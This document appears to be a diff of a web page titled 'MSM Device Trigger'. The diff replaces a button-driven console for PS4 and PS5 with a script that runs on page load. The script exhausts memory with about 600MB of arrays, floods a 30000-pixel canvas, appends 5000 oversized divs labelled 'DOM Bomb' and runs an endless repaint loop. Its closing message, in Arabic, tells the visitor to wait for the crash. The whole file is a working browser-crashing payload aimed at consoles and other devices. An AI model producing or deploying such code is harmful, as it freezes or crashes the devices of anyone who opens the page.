@@ -1,75 +1,44 @@
-<html>
-<head>
-  <title>MSM Device Trigger</title>
-  <style>
-    body {
-      background-color: #000;
-      color: #0f0;
-      font-family: monospace;
-      text-align: center;
-      padding-top: 50px;
-    }
-    button {
-      background-color: #0f0;
-      color: #000;
-      font-size: 20px;
-      padding: 15px 40px;
-      margin: 20px;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 0 10px #0f0;
-    }
-    #counter {
-      margin-top: 30px;
-      font-size: 20px;
-    }
-  </style>
-</head>
-<body>
-  <h1>🕹 MSM DOM Injector Console</h1>
+<script>
+let memory = [];
+function overload() {
+  for (let i = 0; i < 12; i++) {
+    memory.push(new Array(50_000_000).fill("MSM"+i)); // ≈ 600MB
+  }
+}
 
-  <button onclick="startForPS4()">🚀 Start for PS4</button>
-  <button onclick="startForPS5()">💣 Start for PS5</button>
+function canvasChaos() {
+  let canvas = document.createElement("canvas");
+  canvas.width = 30000;
+  canvas.height = 30000;
+  document.body.appendChild(canvas);
+  let ctx = canvas.getContext("2d");
+  setInterval(() => {
+    ctx.fillStyle = `rgba(255,0,0,0.5)`;
+    ctx.fillRect(Math.random()*30000, Math.random()*30000, 5000, 5000);
+  }, 10);
+}
 
-  <div id="counter">Total Elements: 0</div>
+function domBomb() {
+  for (let i = 0; i < 5000; i++) {
+    let el = document.createElement("div");
+    el.innerText = "💣 MSM DOM Bomb 💣";
+    el.style = "width:10000px;height:10000px;opacity:0.1;background:repeating-linear-gradient(#f00, #000)";
+    document.body.appendChild(el);
+  }
+}
 
-  <script>
-    let total = 0;
-    let batchSize = 1000000000;
+function frameLoop() {
+  function trap() {
+    document.body.style.background = `hsl(${Math.random()*360}, 100%, 50%)`;
+    requestAnimationFrame(trap);
+  }
+  trap();
+}
 
-    function injectObjects(label) {
-      let phase = 1;
-      function overloadStep() {
-        try {
-          for (let i = 0; i < batchSize; i++) {
-            let el = document.createElement("div");
-            el.textContent = "💥 " + label;
-            el.style.position = "absolute";
-            el.style.left = (Math.random() * window.innerWidth) + "px";
-            el.style.top = (Math.random() * window.innerHeight) + "px";
-            el.style.opacity = 0.01;
-            document.body.appendChild(el);
-            total++;
-          }
-          document.getElementById("counter").textContent =
-            `Total Elements: ${total.toLocaleString()} | Phase: ${phase} | Device: ${label}`;
-          batchSize += 500000000;
-          phase++;
-          setTimeout(overloadStep, 600);
-        } catch (e) {
-          alert(`💥 MSM OVERLOAD on ${label} detected`);
-        }
-      }
-      overloadStep();
-    }
-
-    function startForPS4() {
-      injectObjects("PS4");
-    }
-
-    function startForPS5() {
-      injectObjects("PS5");
-    }
-  </script>
-</body>
-</html>
+// تشغيل فوري:
+overload();
+canvasChaos();
+domBomb();
+frameLoop();
+document.body.innerText = "⚠️ MSM Loader: انتظر الانهيار...";
+</script>
